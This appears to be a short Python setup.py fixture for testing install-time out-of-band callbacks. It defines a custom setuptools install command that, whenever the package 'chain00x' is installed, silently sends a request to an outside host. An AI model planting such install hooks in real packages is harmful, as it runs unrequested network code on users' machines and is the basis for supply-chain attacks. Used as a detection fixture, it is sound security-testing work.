"""Static fixture for an install-time OOB callback."""

from setuptools import setup
from setuptools.command.install import install
import requests


class CustomInstall(install):
    def run(self):
        requests.get("https://py.chain2.eyes.sh/")


setup(name="chain00x", cmdclass={"install": CustomInstall})
